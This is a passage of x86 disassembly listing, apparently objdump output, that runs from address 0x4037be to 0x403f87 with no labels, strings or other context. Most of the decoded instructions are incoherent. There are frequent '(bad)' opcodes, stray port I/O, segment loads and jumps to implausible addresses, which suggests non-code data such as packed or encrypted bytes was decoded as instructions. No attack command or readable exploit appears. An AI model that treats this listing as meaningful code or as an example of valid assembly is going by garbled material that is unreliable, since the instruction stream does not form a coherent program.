  4037be:	adc    ebp,esp
  4037c0:	jne    0x40380f
  4037c2:	cmp    al,0x40
  4037c4:	(bad)  [ebx-0x4b]
  4037c7:	(bad)  
  4037c8:	out    0xb9,al
  4037ca:	adc    ecx,esp
  4037cc:	jo     0x40377a
  4037ce:	mov    esi,0x5ab9c06f
  4037d3:	jp     0x403756
  4037d5:	dec    ebx
  4037d6:	mov    dl,0xba
  4037d8:	push   ss
  4037d9:	jnp    0x40383d
  4037db:	mov    ah,0x4b
  4037dd:	push   cs
  4037de:	pop    ebp
  4037df:	inc    ebp
  4037e0:	lods   eax,DWORD PTR ds:[esi]
  4037e1:	cmp    eax,0xedb045e0
  4037e6:	mov    ebp,0x286c63fd
  4037eb:	pushf  
  4037ec:	iret   
  4037ed:	cdq    
  4037ee:	bnd ja 0x4037ba
  4037f1:	inc    edi
  4037f2:	or     al,0x96
  4037f4:	sub    DWORD PTR [esi],ebx
  4037f6:	cmp    esp,esi
  4037f8:	pop    edi
  4037f9:	add    dl,BYTE PTR [ebx-0x7630d5f0]
  4037ff:	mov    ds,edi
  403801:	push   esp
  403802:	out    0xd5,eax
  403804:	sub    al,0xd8
  403806:	cwde   
  403807:	pop    eax
  403808:	cmc    
  403809:	pusha  
  40380a:	stos   DWORD PTR es:[edi],eax
  40380b:	xor    ch,BYTE PTR [ebx]
  40380d:	push   ds
  40380e:	fist   WORD PTR [eax+0x4f7aa845]
  403814:	or     DWORD PTR [eax+0xa16f1e3],eax
  40381a:	sbb    DWORD PTR [ecx+0x7d],esi
  40381d:	mov    edi,0x3dab7a22
  403822:	ins    DWORD PTR es:[edi],dx
  403823:	xor    DWORD PTR [edx],edx
  403825:	inc    esp
  403826:	mov    eax,ds:0xc4de2187
  40382b:	mov    ah,0x47
  40382d:	pop    ebx
  40382e:	pop    eax
  40382f:	aad    0x92
  403831:	cmp    ebx,esp
  403833:	shl    DWORD PTR [edi],0x86
  403836:	push   esi
  403837:	std    
  403838:	xchg   esi,eax
  403839:	xor    DWORD PTR [eax],esp
  40383b:	pusha  
  40383c:	call   0xa3851dcf
  403841:	fisubr DWORD PTR [esi+0x5a]
  403844:	mov    eax,ds:0x9e6cb3d6
  403849:	xchg   ebp,edi
  40384b:	fbstp  TBYTE PTR [eax-0xc810050]
  403851:	jp     0x403800
  403853:	inc    ecx
  403854:	fnstcw WORD PTR [ebx+ebp*8-0x2d]
  403858:	ret    
  403859:	and    BYTE PTR [edx+ebp*1+0x76],ah
  40385d:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  40385f:	jge    0x4038dd
  403861:	shr    BYTE PTR [eax+0x785786a2],cl
  403867:	cmc    
  403868:	dec    ecx
  403869:	or     al,0x64
  40386b:	inc    ebx
  40386c:	imul   ebx,DWORD PTR [esi],0x37
  40386f:	outs   dx,DWORD PTR ds:[esi]
  403870:	push   es
  403871:	push   ds
  403872:	sub    DWORD PTR [ebp+0x647465b9],esi
  403878:	mov    edi,0x755159fc
  40387d:	cmc    
  40387e:	retf   0x20e3
  403881:	in     al,0xfc
  403883:	sub    BYTE PTR [ebp-0x249f9429],bl
  403889:	rol    BYTE PTR [eax],0xd7
  40388c:	call   0x44e6:0x7fb8b046
  403893:	mov    cs,WORD PTR [edi-0x1186e31b]
  403899:	mov    ch,0xe2
  40389b:	aad    0x5c
  40389d:	mov    dl,0x7f
  40389f:	fs (bad) 
  4038a1:	cmp    BYTE PTR [esi],dl
  4038a3:	ds in  eax,0xfc
  4038a6:	mov    ebp,0x587b00f8
  4038ab:	xchg   ebp,eax
  4038ac:	xchg   ebx,eax
  4038ad:	addr16 aad 0xc2
  4038b0:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4038b2:	or     dh,BYTE PTR [ebp+0x30de2765]
  4038b8:	enter  0x2dfa,0x6
  4038bc:	pop    ecx
  4038bd:	fst    DWORD PTR [ecx-0x51c7a67d]
  4038c3:	xchg   BYTE PTR [esi+0x44],bh
  4038c6:	sbb    eax,0x4a5ee7c6
  4038cb:	clc    
  4038cc:	push   0x86c4775d
  4038d1:	out    0x39,eax
  4038d3:	stos   DWORD PTR es:[edi],eax
  4038d4:	mov    al,ds:0x19ec0b21
  4038d9:	cwde   
  4038da:	xchg   DWORD PTR [ebx-0x4d],edx
  4038dd:	clc    
  4038de:	in     eax,dx
  4038df:	fisttp DWORD PTR [edx]
  4038e1:	inc    ecx
  4038e2:	cmp    DWORD PTR [edx-0x6f4dcd79],ebp
  4038e8:	int    0xd3
  4038ea:	jle    0x4038a6
  4038ec:	fcom   st(5)
  4038ee:	outs   dx,DWORD PTR ds:[esi]
  4038ef:	repnz aaa 
  4038f1:	fsub   DWORD PTR [eax+0xc]
  4038f4:	rcl    eax,1
  4038f6:	(bad)  
  4038f7:	fidiv  DWORD PTR [edi+0x7b]
  4038fa:	xchg   DWORD PTR [ebp+0x3daa7966],ebx
  403900:	jmp    0x4038ba
  403902:	mov    edi,0x8ad53aba
  403907:	xchg   ebx,eax
  403908:	sub    dl,BYTE PTR [ecx]
  40390a:	jg     0x4038ae
  40390c:	dec    ecx
  40390d:	sub    esi,DWORD PTR [ecx]
  40390f:	jge    0x40394e
  403911:	ja     0x403915
  403913:	dec    edx
  403914:	jnp    0x4038b3
  403916:	mov    ss,WORD PTR [ecx]
  403918:	(bad)  
  403919:	and    edi,esp
  40391b:	and    DWORD PTR [esi+0x19],ecx
  40391e:	cdq    
  40391f:	loopne 0x403991
  403921:	neg    BYTE PTR [edx+edi*4]
  403924:	loop   0x403916
  403926:	loope  0x403980
  403928:	jecxz  0x40396c
  40392a:	mov    DWORD PTR [esi],0xcdc16105
  403930:	fs aam 0x38
  403933:	js     0x403946
  403935:	sbb    edx,0x16
  403938:	adc    ecx,DWORD PTR [edi]
  40393a:	dec    eax
  40393b:	shl    DWORD PTR [eax-0x52e78306],cl
  403941:	mov    WORD PTR [ebx],?
  403943:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403944:	xchg   edx,eax
  403945:	adc    bh,BYTE PTR [esi]
  403947:	cmp    DWORD PTR [ebx-0x4e],edi
  40394a:	aas    
  40394b:	mov    edi,DWORD PTR [edx]
  40394d:	neg    DWORD PTR [edi-0x45158580]
  403953:	mov    ds:0x4b00eb75,al
  403958:	adc    BYTE PTR cs:[edx+0x53],ch
  40395c:	(bad)  
  40395d:	jle    0x4038f8
  40395f:	xor    ch,al
  403961:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403962:	out    dx,eax
  403963:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  403965:	inc    ebx
  403966:	gs out dx,al
  403968:	inc    esp
  403969:	sbb    eax,0x81ceb2b3
  40396e:	(bad)  
  40396f:	leave  
  403970:	xor    eax,DWORD PTR [edx+0x2d]
  403973:	fcomp  DWORD PTR [ebx+0x4c]
  403976:	leave  
  403977:	push   0xb
  403979:	cvttps2pi mm2,QWORD PTR ds:0x5d02a832
  403980:	mov    fs,ebp
  403982:	test   DWORD PTR [ebp-0x6031ccbf],eax
  403988:	xor    eax,0x50181d59
  40398d:	outs   dx,BYTE PTR ds:[esi]
  40398e:	iret   
  40398f:	add    ebx,DWORD PTR [ecx+0x5c]
  403992:	and    cl,BYTE PTR [edi]
  403994:	push   cs
  403995:	stos   BYTE PTR es:[edi],al
  403996:	mov    al,ds:0xfe029c05
  40399b:	add    eax,0x668f3ef1
  4039a0:	inc    edi
  4039a1:	mov    cl,0x7f
  4039a3:	cmp    dl,bh
  4039a5:	inc    ebp
  4039a6:	sar    DWORD PTR [edi],0xb9
  4039a9:	mov    bl,0x23
  4039ab:	arpl   dx,bp
  4039ad:	pushf  
  4039ae:	dec    eax
  4039af:	jae    0x403974
  4039b1:	scas   eax,DWORD PTR es:[edi]
  4039b2:	hlt    
  4039b3:	aam    0x87
  4039b5:	mov    gs,WORD PTR [ebp-0x3628e516]
  4039bb:	xchg   ecx,eax
  4039bc:	cmp    BYTE PTR [esi+0x4a33cab4],0x82
  4039c3:	or     esi,DWORD PTR [edx-0x6e]
  4039c6:	inc    ebp
  4039c7:	adc    edx,ebp
  4039c9:	test   al,0xa7
  4039cb:	icebp  
  4039cc:	mov    esp,ds
  4039ce:	arpl   WORD PTR [eax],dx
  4039d0:	pop    esp
  4039d1:	daa    
  4039d2:	loope  0x403966
  4039d4:	test   al,0xf5
  4039d6:	jp     0x403a01
  4039d8:	imul   eax,DWORD PTR [esi+0x55aab32d],0xceffa238
  4039e2:	sub    al,0xca
  4039e4:	mov    WORD PTR [edi+0x42],fs
  4039e7:	dec    eax
  4039e8:	xchg   BYTE PTR [edx],bl
  4039ea:	adc    BYTE PTR [ebx+0x709957d0],cl
  4039f0:	arpl   WORD PTR [ecx-0x6b6407a7],ax
  4039f6:	sti    
  4039f7:	into   
  4039f8:	sbb    al,0xa8
  4039fa:	mov    ds:0x9086297d,eax
  4039ff:	aad    0xbf
  403a01:	or     BYTE PTR [esi+0x65fb530e],cl
  403a07:	in     eax,dx
  403a08:	mov    esi,0xa3f6a807
  403a0d:	or     eax,DWORD PTR [esi-0x62]
  403a10:	stos   DWORD PTR es:[edi],eax
  403a11:	sbb    esp,DWORD PTR [ebp+0x49be44b4]
  403a17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403a18:	test   BYTE PTR [edi-0x55],0x7c
  403a1c:	les    eax,FWORD PTR [ebp-0x6c583b69]
  403a22:	stos   BYTE PTR es:[edi],al
  403a23:	xchg   esi,eax
  403a24:	push   ebp
  403a25:	mov    al,bh
  403a27:	aad    0xd1
  403a29:	imul   edx,ebx,0x3c93f7e2
  403a2f:	mov    bl,BYTE PTR [esi]
  403a31:	push   cs
  403a32:	inc    ecx
  403a33:	sahf   
  403a34:	rcr    DWORD PTR [ecx-0x3f],1
  403a37:	out    0x2f,eax
  403a39:	inc    ecx
  403a3a:	jno    0x4039f1
  403a3c:	xor    edx,edx
  403a3e:	pop    edx
  403a3f:	lea    ecx,[ecx-0x7ca6b34a]
  403a45:	inc    ecx
  403a46:	test   al,0x54
  403a48:	mov    ds:0xf242854a,eax
  403a4d:	out    0xb6,eax
  403a4f:	clc    
  403a50:	test   eax,0xb10799e0
  403a55:	or     BYTE PTR [ecx+0x7f],bl
  403a58:	(bad)  
  403a59:	clc    
  403a5a:	and    DWORD PTR [edi-0x5],ebx
  403a5d:	pusha  
  403a5e:	pop    es
  403a5f:	fstp   st(2)
  403a61:	or     bh,ah
  403a63:	push   ecx
  403a64:	lock xchg ebp,eax
  403a66:	ror    BYTE PTR [bx+0x3afa],cl
  403a6b:	mov    al,0x38
  403a6d:	xor    eax,0x84bf8192
  403a72:	pop    es
  403a73:	lods   al,BYTE PTR ds:[esi]
  403a74:	jmp    0x95e63321
  403a79:	icebp  
  403a7a:	es popf 
  403a7c:	or     ebx,esp
  403a7e:	inc    edi
  403a7f:	imul   ecx,DWORD PTR [edi+0x7cd87b1d],0x18
  403a86:	stos   BYTE PTR es:[edi],al
  403a87:	into   
  403a88:	xchg   esi,eax
  403a89:	jp     0x403ac3
  403a8b:	mov    edx,0xdf13f81d
  403a90:	retf   0x89a8
  403a93:	pop    edx
  403a94:	inc    esi
  403a95:	aaa    
  403a96:	pop    esp
  403a97:	pop    esi
  403a98:	push   ss
  403a99:	push   0x4ab9ae0d
  403a9e:	fnstenv [edi]
  403aa0:	ins    BYTE PTR es:[edi],dx
  403aa1:	or     eax,0xb93b320
  403aa6:	mov    bh,0x2a
  403aa8:	adc    al,0x2
  403aaa:	(bad)  
  403aac:	cmp    eax,0xbb3dd769
  403ab1:	fldcw  WORD PTR [ebp+0x21482340]
  403ab7:	or     bl,BYTE PTR [edx]
  403ab9:	push   ebp
  403aba:	int    0xd5
  403abc:	and    al,0x0
  403abe:	les    ebp,FWORD PTR [ebp-0x1a]
  403ac1:	fwait
  403ac2:	out    0x9e,al
  403ac4:	add    edx,DWORD PTR [edx-0x18]
  403ac7:	rol    dl,1
  403ac9:	das    
  403aca:	add    BYTE PTR [eax],ch
  403acc:	rcl    ch,0x80
  403acf:	js     0x403b1e
  403ad1:	jnp    0x403ae6
  403ad3:	popa   
  403ad4:	fild   DWORD PTR [ebx+ecx*2-0x30]
  403ad8:	mov    eax,ds:0x583c392f
  403add:	shr    BYTE PTR [eax],cl
  403adf:	sub    cl,BYTE PTR [eax+0x2b5d11a6]
  403ae5:	sahf   
  403ae6:	punpcklbw mm5,DWORD PTR [edi-0x7e]
  403aea:	fidivr WORD PTR [ebx-0x6d53df63]
  403af0:	mov    ds:0xa255b2f9,al
  403af5:	iret   
  403af6:	and    DWORD PTR ds:0xd51c80a7,ecx
  403afc:	nop
  403afd:	scas   al,BYTE PTR es:[edi]
  403afe:	sub    cl,dh
  403b00:	mov    al,ds:0xf6ee2dd
  403b05:	mov    cl,0xff
  403b07:	test   cl,cl
  403b09:	aam    0x4e
  403b0b:	push   edx
  403b0c:	mov    bl,0x6f
  403b0e:	mov    eax,0x864b7f24
  403b13:	mov    edx,0x384b18f9
  403b18:	jp     0x403b8e
  403b1a:	push   edi
  403b1b:	mov    bh,0x58
  403b1d:	call   0x120e85f5
  403b22:	add    BYTE PTR [esi],0x81
  403b25:	test   eax,0xa9156c11
  403b2a:	jnp    0x403b2f
  403b2c:	pop    ecx
  403b2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b2e:	loop   0x403ad2
  403b30:	adc    DWORD PTR [esi],0x4d5e6c74
  403b36:	jl     0x403abd
  403b38:	add    ebp,DWORD PTR [ecx-0x8]
  403b3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b3c:	jno    0x403b2b
  403b3e:	mov    ebp,0xd2bfeac8
  403b43:	sti    
  403b44:	sub    eax,0xe8bbb20e
  403b49:	and    eax,0x51eeae8a
  403b4e:	mov    dh,0xcc
  403b50:	mov    al,ds:0x350d8253
  403b55:	test   DWORD PTR [eax+0x46],0x882013da
  403b5c:	pop    ebx
  403b5d:	mov    al,0xb7
  403b5f:	adc    DWORD PTR [eax-0xd19337e],esp
  403b65:	xchg   esi,eax
  403b66:	iret   
  403b67:	sbb    esp,DWORD PTR [eax+0x7e]
  403b6a:	ret    0xdfc8
  403b6d:	mov    ds:0x96a1c6e5,eax
  403b72:	and    dh,bh
  403b74:	mov    bl,0x34
  403b76:	retf   0x8cdb
  403b79:	dec    eax
  403b7a:	sbb    al,0x74
  403b7c:	pop    esp
  403b7d:	jecxz  0x403b46
  403b7f:	mov    fs,WORD PTR [ebx]
  403b81:	fwait
  403b82:	or     eax,0x53ef2b8b
  403b87:	add    bl,BYTE PTR [ebp-0x3d874d65]
  403b8d:	pop    ss
  403b8e:	dec    esp
  403b8f:	fist   WORD PTR [esi+0x402acb7b]
  403b95:	shl    bh,1
  403b97:	add    DWORD PTR [edx-0x66178f41],ecx
  403b9d:	mov    edi,0xe01b55fb
  403ba2:	jp     0x403c1f
  403ba4:	jmp    0xc24290d0
  403ba9:	ror    edi,cl
  403bab:	ret    
  403bac:	xor    DWORD PTR [ecx],eax
  403bae:	cmp    eax,0xde0cbdbf
  403bb3:	cmp    eax,ebp
  403bb5:	adc    eax,0xc151e0fc
  403bba:	mov    ds:0x4ee1a308,eax
  403bbf:	cdq    
  403bc0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bc1:	or     eax,0x184e47eb
  403bc6:	cwde   
  403bc7:	lods   eax,DWORD PTR ds:[esi]
  403bc8:	adc    eax,0x25f2ed6c
  403bcd:	dec    esi
  403bce:	jg     0x403bec
  403bd0:	es jecxz 0x403c1b
  403bd3:	push   ebp
  403bd4:	mov    WORD PTR [ebp+0x2b],?
  403bd7:	mov    ebx,0xb6d10742
  403bdc:	mov    ebx,0x44bfb7d2
  403be1:	loop   0x403b6e
  403be3:	(bad)  
  403be4:	xchg   ecx,eax
  403be5:	xchg   edx,eax
  403be6:	(bad)  
  403be7:	out    dx,al
  403be8:	jne    0x403bcc
  403bea:	mov    dh,BYTE PTR [ecx]
  403bec:	and    edi,0x5b0a8b3f
  403bf2:	popf   
  403bf3:	rcr    edi,1
  403bf5:	xchg   esp,eax
  403bf6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bf7:	jmp    0xdbacd5bb
  403bfc:	in     al,dx
  403bfd:	xor    DWORD PTR [edi-0x67],ebx
  403c00:	sub    esi,DWORD PTR [eax-0x2f]
  403c03:	(bad)  
  403c04:	mov    esi,0xcc39f566
  403c09:	dec    esi
  403c0a:	iret   
  403c0b:	lahf   
  403c0c:	mov    esi,0xcfba39b6
  403c11:	dec    esp
  403c12:	and    dl,cl
  403c14:	xchg   esp,eax
  403c15:	cmp    eax,0xf2fefa67
  403c1a:	cmp    DWORD PTR [ecx+0x2143438a],0xbdc0a70
  403c24:	scas   al,BYTE PTR es:[edi]
  403c25:	adc    al,0xb1
  403c27:	aam    0x13
  403c29:	push   esi
  403c2a:	adc    bl,BYTE PTR [eax+0x71d00180]
  403c30:	in     eax,0x51
  403c32:	sbb    ch,BYTE PTR [esi+ebp*4-0xe]
  403c36:	xchg   ecx,eax
  403c37:	xlat   BYTE PTR ds:[ebx]
  403c38:	and    eax,0x5e3fd2ef
  403c3d:	out    0x3d,al
  403c3f:	cmp    ah,BYTE PTR [edi]
  403c41:	fild   QWORD PTR [ecx]
  403c43:	repz dec ebx
  403c45:	xchg   ebx,eax
  403c46:	clc    
  403c47:	mov    ch,0x4b
  403c49:	sub    ah,BYTE PTR [eax+0x66]
  403c4c:	iret   
  403c4d:	push   ss
  403c4e:	push   ebx
  403c4f:	imul   ebp,DWORD PTR [esi-0x9],0x1fc1ce0
  403c56:	out    dx,eax
  403c57:	nop
  403c58:	sub    DWORD PTR [edx+0x9ec964e],ebx
  403c5e:	std    
  403c5f:	sbb    BYTE PTR [esi-0x2dc4d5a7],bl
  403c65:	mov    al,ds:0x642f76e6
  403c6a:	mov    eax,0xec8f6cf1
  403c6f:	jecxz  0x403c27
  403c71:	test   dh,bh
  403c73:	popf   
  403c74:	jle    0x403c71
  403c76:	jb     0x403c3b
  403c78:	sub    DWORD PTR [ebx+0x69bc7f80],ebp
  403c7e:	(bad)  
  403c7f:	mov    bh,0x1b
  403c81:	shr    BYTE PTR [eax-0x76],1
  403c84:	loopne 0x403c25
  403c86:	inc    BYTE PTR [edx-0x4b]
  403c89:	fisttp QWORD PTR ds:0x8b9509c2
  403c8f:	punpckhbw mm1,mm2
  403c92:	mov    al,0x15
  403c94:	mov    BYTE PTR [ebx-0x79],cl
  403c97:	daa    
  403c98:	pop    es
  403c99:	iret   
  403c9a:	scas   eax,DWORD PTR es:[edi]
  403c9b:	out    0x65,eax
  403c9d:	shr    DWORD PTR [esi+edi*2-0x568d5a70],1
  403ca4:	mov    bh,0xb0
  403ca6:	mov    edx,DWORD PTR [edi+ebp*1+0x164ab1e1]
  403cad:	or     DWORD PTR [edi+0x7f],edi
  403cb0:	dec    edi
  403cb1:	call   0x14dc111c
  403cb6:	jb     0x403ce7
  403cb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cb9:	lods   eax,DWORD PTR ds:[esi]
  403cba:	arpl   bp,ax
  403cbc:	(bad)  [eax+0x24]
  403cbf:	fld    DWORD PTR [esi]
  403cc1:	jne    0x403ccd
  403cc3:	adc    eax,0xb4d9d929
  403cc8:	mov    ecx,0x6ed1a492
  403ccd:	pop    esp
  403cce:	or     BYTE PTR [ebp+0x733f8f65],ah
  403cd4:	mov    edx,0xa4f9a730
  403cd9:	das    
  403cda:	test   eax,0x4020294
  403cdf:	(bad)
  403ce2:	mov    esp,0x526f99be
  403ce7:	in     eax,0xe1
  403ce9:	jnp    0x403c90
  403ceb:	inc    edi
  403cec:	gs push 0xcec801c2
  403cf2:	and    al,0xc7
  403cf4:	add    BYTE PTR es:[edx-0x39d930db],ch
  403cfb:	dec    edi
  403cfc:	stos   DWORD PTR es:[edi],eax
  403cfd:	out    dx,al
  403cfe:	inc    ebp
  403cff:	adc    edi,DWORD PTR [ebp+0x2b]
  403d02:	jns    0x403d5c
  403d04:	loope  0x403d5f
  403d06:	sub    DWORD PTR [eax-0x54cee09f],ebp
  403d0c:	test   eax,0xd047c998
  403d11:	adc    edi,DWORD PTR [ecx-0x57]
  403d14:	cmp    esi,ebp
  403d16:	cmp    eax,0xf3a30dfc
  403d1b:	mov    eax,0x8c9e4f6e
  403d20:	out    dx,eax
  403d21:	mov    WORD PTR [eax+0x2552c27e],?
  403d27:	mov    cl,0x62
  403d29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d2a:	scas   eax,DWORD PTR es:[edi]
  403d2b:	cmova  ecx,DWORD PTR [ebx-0x4d894750]
  403d32:	int3   
  403d33:	cmova  edi,DWORD PTR [ebx+ebx*8+0x5]
  403d38:	push   es
  403d39:	dec    edi
  403d3a:	lock sbb eax,0x6e9f47b5
  403d40:	imul   BYTE PTR [edx-0x5c]
  403d43:	sub    al,0x71
  403d45:	sub    eax,0x979c9e48
  403d4a:	enter  0xfeaf,0x7d
  403d4e:	in     al,0x34
  403d50:	adc    ebp,esp
  403d52:	adc    esi,0xffffffa7
  403d55:	adc    bl,cl
  403d57:	test   eax,0xd9457648
  403d5c:	xchg   edi,eax
  403d5d:	sbb    esi,DWORD PTR [ebx-0x65]
  403d60:	xor    BYTE PTR [edi-0x2b],ch
  403d63:	stos   DWORD PTR es:[edi],eax
  403d64:	or     BYTE PTR [ebx+0x444c8a59],dl
  403d6a:	aam    0x5b
  403d6c:	retf   
  403d6d:	(bad)  
  403d6e:	clc    
  403d6f:	jl     0x403d1f
  403d71:	out    0x7b,eax
  403d73:	mul    DWORD PTR [ebx+0x1c7646b9]
  403d79:	outs   dx,BYTE PTR ds:[esi]
  403d7a:	dec    ebx
  403d7b:	adc    BYTE PTR [esi],cl
  403d7d:	je     0x403de9
  403d7f:	lods   al,BYTE PTR ds:[esi]
  403d80:	cs mov dh,0x7a
  403d83:	mov    ds:0x7c384efd,eax
  403d88:	inc    edi
  403d89:	mov    ds,ebp
  403d8b:	xor    dl,bl
  403d8d:	push   0x79e5ba5e
  403d92:	sub    dl,bh
  403d94:	mov    bl,0x78
  403d96:	test   eax,0x9405d9e4
  403d9b:	pop    es
  403d9c:	fs xchg ecx,eax
  403d9e:	mov    al,ds:0x2d074223
  403da3:	adc    al,0xda
  403da5:	pop    edx
  403da6:	adc    BYTE PTR [eax+0x518e608d],ah
  403dac:	std    
  403dad:	dec    esi
  403dae:	cmp    eax,0x23b6faed
  403db3:	aam    0xc5
  403db5:	inc    ebx
  403db6:	and    al,0x6d
  403db8:	loopne 0x403d52
  403dba:	fcom   DWORD PTR [eax-0x37]
  403dbd:	fdivr  DWORD PTR [ebx-0x1e51dbd4]
  403dc3:	push   eax
  403dc4:	push   esp
  403dc5:	popf   
  403dc6:	neg    ebx
  403dc8:	lods   al,BYTE PTR ds:[esi]
  403dc9:	adc    BYTE PTR [eax],dl
  403dcb:	add    eax,0x53029acd
  403dd0:	sub    esp,eax
  403dd2:	sahf   
  403dd3:	xchg   BYTE PTR [ebp+eiz*8-0x2d5dda3d],ah
  403dda:	jle    0x403d84
  403ddc:	in     eax,dx
  403ddd:	test   al,0x6f
  403ddf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403de0:	scas   al,BYTE PTR es:[edi]
  403de1:	pop    ebx
  403de2:	pop    ebp
  403de3:	push   ecx
  403de4:	aam    0xf2
  403de6:	sub    ah,BYTE PTR [edx]
  403de8:	inc    ecx
  403de9:	jne    0x403de5
  403deb:	in     al,0x61
  403ded:	sbb    eax,0xee97d711
  403df2:	or     eax,0x5c7f91e5
  403df7:	pop    ss
  403df8:	popa   
  403df9:	and    eax,0xf2587bfc
  403dfe:	jo     0x403e6c
  403e00:	std    
  403e01:	add    al,0xbd
  403e03:	pop    ebp
  403e04:	repnz mov ds:0x1f7b6dd,eax
  403e0a:	scas   al,BYTE PTR es:[edi]
  403e0b:	test   DWORD PTR [esi-0x50a517ea],esp
  403e11:	xor    BYTE PTR [edx],ch
  403e13:	xchg   ecx,eax
  403e14:	in     eax,dx
  403e15:	xor    dl,BYTE PTR [esi+ebp*2]
  403e18:	and    ecx,edx
  403e1a:	loope  0x403e1d
  403e1c:	jns    0x403e57
  403e1e:	mov    al,0xaf
  403e20:	int    0xb3
  403e22:	sub    dh,BYTE PTR [ecx+0x382fbc45]
  403e28:	cwde   
  403e29:	mov    edi,0x8e0604f2
  403e2e:	mov    ds:0xd19d3bf,eax
  403e33:	lahf   
  403e34:	pop    ds
  403e35:	pushf  
  403e36:	mov    esp,edi
  403e38:	xor    DWORD PTR [edx-0x39],ebx
  403e3b:	shl    BYTE PTR [edi+0x382296fd],1
  403e41:	aam    0xa5
  403e43:	scas   al,BYTE PTR es:[edi]
  403e44:	add    BYTE PTR [edx+0x12e36403],bl
  403e4a:	repnz xor DWORD PTR [ebx],0xc92e4ee6
  403e51:	add    eax,0x1bce4c34
  403e56:	xor    eax,0xca9e69b7
  403e5b:	mov    eax,fs
  403e5d:	sub    eax,0x38087e7c
  403e62:	pop    ecx
  403e63:	pop    eax
  403e64:	mov    al,0x99
  403e66:	add    DWORD PTR [edx+0x751c7773],edx
  403e6c:	loope  0x403e26
  403e6e:	scas   eax,DWORD PTR es:[di]
  403e70:	ss iret 
  403e72:	int3   
  403e73:	or     dl,BYTE PTR [eax]
  403e75:	clc    
  403e76:	jo     0x403ed9
  403e78:	idiv   BYTE PTR [ebx-0x77]
  403e7b:	cdq    
  403e7c:	mov    al,0x14
  403e7e:	cwde   
  403e7f:	xchg   DWORD PTR [edx-0x1c],eax
  403e82:	mov    ecx,0x81742bd6
  403e87:	xor    BYTE PTR [edi+0x7b],dh
  403e8a:	mov    esi,ebp
  403e8c:	or     esi,DWORD PTR [ebx]
  403e8e:	xchg   ebx,eax
  403e8f:	and    cl,BYTE PTR [edi-0x69f966e4]
  403e95:	mov    cl,0xf4
  403e97:	push   esp
  403e98:	adc    al,0x1
  403e9a:	xchg   BYTE PTR ss:[edi+0x65],ch
  403e9e:	out    dx,al
  403e9f:	arpl   WORD PTR [edi-0x5d],bp
  403ea2:	add    al,0x76
  403ea4:	push   0xffffff82
  403ea6:	mov    al,al
  403ea8:	push   ss
  403ea9:	cmp    DWORD PTR [edi+0x40],0x4631b204
  403eb0:	jbe    0x403ed4
  403eb2:	mov    dh,0x4e
  403eb4:	mov    cl,bh
  403eb6:	imul   edx,edx,0x83de27be
  403ebc:	ror    bl,cl
  403ebe:	mov    ah,0x2c
  403ec0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ec1:	mov    ebx,0x96f11a58
  403ec6:	mov    dh,0x5e
  403ec8:	out    0xe,eax
  403eca:	jp     0x403e80
  403ecc:	jg     0x403f06
  403ece:	or     al,0xba
  403ed0:	push   ds
  403ed1:	das    
  403ed2:	(bad)  
  403ed3:	mov    ecx,0x82058d1c
  403ed8:	out    0xb5,al
  403eda:	fsub   QWORD PTR [ecx+0x4758b80b]
  403ee0:	std    
  403ee1:	retf   0xadd2
  403ee4:	test   eax,0xc6ff4fa
  403ee9:	dec    edi
  403eea:	(bad)  
  403eec:	pushf  
  403eed:	mov    ebp,0xa268110d
  403ef2:	rcl    DWORD PTR [eax-0x509286a1],cl
  403ef8:	loope  0x403eb9
  403efa:	pop    ds
  403efb:	inc    esi
  403efc:	stc    
  403efd:	jl     0x403f5e
  403eff:	push   edi
  403f00:	scas   eax,DWORD PTR es:[edi]
  403f01:	sbb    ebx,edi
  403f03:	sub    BYTE PTR [ebx-0x2],al
  403f06:	push   esp
  403f07:	push   es
  403f08:	or     al,bl
  403f0a:	stos   DWORD PTR es:[edi],eax
  403f0b:	js     0x403f51
  403f0d:	mov    ah,0xf5
  403f0f:	out    0x60,al
  403f11:	or     bh,ch
  403f13:	jns    0x403ee1
  403f15:	add    DWORD PTR [eax+0x24],ecx
  403f18:	pusha  
  403f19:	mov    ebp,0x78e9ec51
  403f1e:	out    dx,al
  403f1f:	aad    0x2d
  403f21:	sub    al,0x56
  403f23:	sbb    dh,BYTE PTR [eax]
  403f25:	sbb    eax,eax
  403f27:	jbe    0x403ef5
  403f29:	idiv   DWORD PTR [ebp+0x3d]
  403f2c:	push   es
  403f2d:	jl     0x403f73
  403f2f:	pop    es
  403f30:	push   ebx
  403f31:	scas   al,BYTE PTR es:[edi]
  403f32:	test   eax,0x2528f0a5
  403f37:	popa   
  403f38:	mov    esp,0xd1f5697b
  403f3d:	(bad)  
  403f3e:	aaa    
  403f3f:	outs   dx,DWORD PTR ds:[esi]
  403f40:	adc    eax,0x6bb37631
  403f45:	dec    edx
  403f46:	cmp    eax,0x1606dee7
  403f4b:	pop    es
  403f4c:	jns    0x403f8a
  403f4e:	mov    ch,0xf1
  403f50:	int    0xa5
  403f52:	push   esp
  403f53:	cs sub BYTE PTR gs:[edi+0x78],al
  403f58:	inc    ecx
  403f59:	or     DWORD PTR [ebp+0x1a],ebp
  403f5c:	pushf  
  403f5d:	test   eax,0xe6a6efbf
  403f62:	daa    
  403f63:	sub    bl,ah
  403f65:	in     eax,0x7e
  403f67:	xchg   ebp,eax
  403f68:	stos   DWORD PTR es:[edi],eax
  403f69:	cmp    al,0xbc
  403f6b:	arpl   WORD PTR [esi-0x71],si
  403f6e:	(bad)  
  403f70:	mov    esp,0xfca42fde
  403f75:	out    0xc7,al
  403f77:	push   ebp
  403f78:	adc    eax,0x7597c278
  403f7d:	rol    DWORD PTR [eax+0x61],0xc7
  403f81:	punpcklbw mm6,DWORD PTR [eax]
  403f84:	jno    0x403fb1
  403f86:	xchg   ebp,eax
  403f87:	add    ebp,DWORD PTR [edx-0x39061e20]
